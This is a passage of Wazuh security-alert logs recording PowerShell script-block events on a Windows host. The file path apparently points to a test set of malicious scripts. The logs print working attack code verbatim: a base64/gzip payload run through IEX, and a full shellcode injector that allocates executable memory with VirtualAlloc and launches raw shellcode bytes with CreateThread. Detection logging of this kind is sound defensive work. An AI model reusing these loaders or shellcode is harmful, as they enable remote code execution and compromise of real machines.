DS2hlq0Xe72P7UGnmrfswvV0LsLx1NVdVUzbpxhcf359uJzo0/tOUc9VbU/JDIBnWSC29k1ucNHKX/ttm/iMJpgBlKAOzytUZOH5uFGbnOaRMjyU3eekTAgDJoatL1U3Ygx7iTN4fn+hu607xljKNUeDM9KL44U6clReW4b6aurqyHAhXI5EnK+QQJfTHKF9VmhAB2gsC4X4OBvP6nOFxv5eMVc0khS0n7ajO02U5KqyjhdHl3+/6QeCnoCP+6bSH1+9xvrm4gu5J5o+MXy44v/xPgf0dDHVIC3BdcSI/ve+Rs2Dmo6+vLYZQtU4h2e5APwNhanLfgi+RcjBe71dQoAAA=='));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();","scriptBlockId":"b4c4a85f-ff32-4d1a-a842-5d42318bc071"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:23.384+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":93,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304363.2630803","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:43.4146584Z","eventRecordID":"145121","processID":"7128","threadID":"8652","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$ja1 = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $ja1 -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xca,0xbe,0xcc,0xd0,0x59,0x74,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x72,0x18,0x83,0xc2,0x04,0x03,0x72,0xd8,0x32,0xac,0x88,0x08,0x30,0x4f,0x71,0xc8,0x55,0xd9,0x94,0xf9,0x55,0xbd,0xdd,0xa9,0x65,0xb5,0xb0,0x45,0x0d,0x9b,0x20,0xde,0x63,0x34,0x46,0x57,0xc9,0x62,0x69,0x68,0x62,0x56,0xe8,0xea,0x79,0x8b,0xca,0xd3,0xb1,0xde,0x0b,0x14,0xaf,0x13,0x59,0xcd,0xbb,0x86,0x4e,0x7a,0xf1,0x1a,0xe4,0x30,0x17,0x1b,0x19,0x80,0x16,0x0a,0x8c,0x9b,0x40,0x8c,0x2e,0x48,0xf9,0x85,0x28,0x8d,0xc4,0x5c,0xc2,0x65,0xb2,0x5e,0x02,0xb4,0x3b,0xcc,0x6b,0x79,0xce,0x0c,0xab,0xbd,0x31,0x7b,0xc5,0xbe,0xcc,0x7c,0x12,0xbd,0x0a,0x08,0x81,0x65,0xd8,0xaa,0x6d,0x94,0x0d,0x2c,0xe5,0x9a,0xfa,0x3a,0xa1,0xbe,0xfd,0xef,0xd9,0xba,0x76,0x0e,0x0e,0x4b,0xcc,0x35,0x8a,0x10,0x96,0x54,0x8b,0xfc,0x79,0x68,0xcb,0x5f,0x25,0xcc,0x87,0x4d,0x32,0x7d,0xca,0x19,0xf7,0x4c,0xf5,0xd9,0x9f,0xc7,0x86,0xeb,0x00,0x7c,0x01,0x47,0xc8,0x5a,0xd6,0xa8,0xe3,0x1b,0x48,0x57,0x0c,0x5c,0x40,0x93,0x58,0x0c,0xfa,0x32,0xe1,0xc7,0xfa,0xbb,0x34,0x7d,0xfe,0x2b,0x77,0x2a,0x01,0xa0,0x1f,0x29,0x02,0xb7,0x64,0xa4,0xe4,0xe7,0xca,0xe7,0xb8,0x47,0xbb,0x47,0x69,0x2f,0xd1,0x47,0x56,0x4f,0xda,0x8d,0xff,0xe5,0x35,0x78,0x57,0x91,0xac,0x21,0x23,0x00,0x30,0xfc,0x49,0x02,0xba,0xf3,0xae,0xcc,0x4b,0x79,0xbd,0xb8,0xbb,0x34,0x9f,0x6e,0xc3,0xe2,0x8a,0x8e,0x51,0x09,0x1d,0xd9,0xcd,0x13,0x78,0x2d,0x52,0xeb,0xaf,0x26,0x5b,0x79,0x10,0x50,0xa4,0x6d,0x90,0xa0,0xf2,0xe7,0x90,0xc8,0xa2,0x53,0xc3,0xed,0xac,0x49,0x77,0xbe,0x38,0x72,0x2e,0x13,0xea,0x1a,0xcc,0x4a,0xdc,0x84,0x2f,0xb9,0xdc,0xf9,0xf9,0x87,0xaa,0x13,0x3a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$5Lb=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($5Lb.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$5Lb,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: fc22a1d3-3a0d-47c7-b1e2-5fb344bc0180\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2023.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$ja1 = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $ja1 -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xca,0xbe,0xcc,0xd0,0x59,0x74,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x72,0x18,0x83,0xc2,0x04,0x03,0x72,0xd8,0x32,0xac,0x88,0x08,0x30,0x4f,0x71,0xc8,0x55,0xd9,0x94,0xf9,0x55,0xbd,0xdd,0xa9,0x65,0xb5,0xb0,0x45,0x0d,0x9b,0x20,0xde,0x63,0x34,0x46,0x57,0xc9,0x62,0x69,0x68,0x62,0x56,0xe8,0xea,0x79,0x8b,0xca,0xd3,0xb1,0xde,0x0b,0x14,0xaf,0x13,0x59,0xcd,0xbb,0x86,0x4e,0x7a,0xf1,0x1a,0xe4,0x30,0x17,0x1b,0x19,0x80,0x16,0x0a,0x8c,0x9b,0x40,0x8c,0x2e,0x48,0xf9,0x85,0x28,0x8d,0xc4,0x5c,0xc2,0x65,0xb2,0x5e,0x02,0xb4,0x3b,0xcc,0x6b,0x79,0xce,0x0c,0xab,0xbd,0x31,0x7b,0xc5,0xbe,0xcc,0x7c,0x12,0xbd,0x0a,0x08,0x81,0x65,0xd8,0xaa,0x6d,0x94,0x0d,0x2c,0xe5,0x9a,0xfa,0x3a,0xa1,0xbe,0xfd,0xef,0xd9,0xba,0x76,0x0e,0x0e,0x4b,0xcc,0x35,0x8a,0x10,0x96,0x54,0x8b,0xfc,0x79,0x68,0xcb,0x5f,0x25,0xcc,0x87,0x4d,0x32,0x7d,0xca,0x19,0xf7,0x4c,0xf5,0xd9,0x9f,0xc7,0x86,0xeb,0x00,0x7c,0x01,0x47,0xc8,0x5a,0xd6,0xa8,0xe3,0x1b,0x48,0x57,0x0c,0x5c,0x40,0x93,0x58,0x0c,0xfa,0x32,0xe1,0xc7,0xfa,0xbb,0x34,0x7d,0xfe,0x2b,0x77,0x2a,0x01,0xa0,0x1f,0x29,0x02,0xb7,0x64,0xa4,0xe4,0xe7,0xca,0xe7,0xb8,0x47,0xbb,0x47,0x69,0x2f,0xd1,0x47,0x56,0x4f,0xda,0x8d,0xff,0xe5,0x35,0x78,0x57,0x91,0xac,0x21,0x23,0x00,0x30,0xfc,0x49,0x02,0xba,0xf3,0xae,0xcc,0x4b,0x79,0xbd,0xb8,0xbb,0x34,0x9f,0x6e,0xc3,0xe2,0x8a,0x8e,0x51,0x09,0x1d,0xd9,0xcd,0x13,0x78,0x2d,0x52,0xeb,0xaf,0x26,0x5b,0x79,0x10,0x50,0xa4,0x6d,0x90,0xa0,0xf2,0xe7,0x90,0xc8,0xa2,0x53,0xc3,0xed,0xac,0x49,0x77,0xbe,0x38,0x72,0x2e,0x13,0xea,0x1a,0xcc,0x4a,0xdc,0x84,0x2f,0xb9,0xdc,0xf9,0xf9,0x87,0xaa,0x13,0x3a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$5Lb=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($5Lb.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$5Lb,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"fc22a1d3-3a0d-47c7-b1e2-5fb344bc0180","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2023.ps1"}}},"location":"EventChannel"}
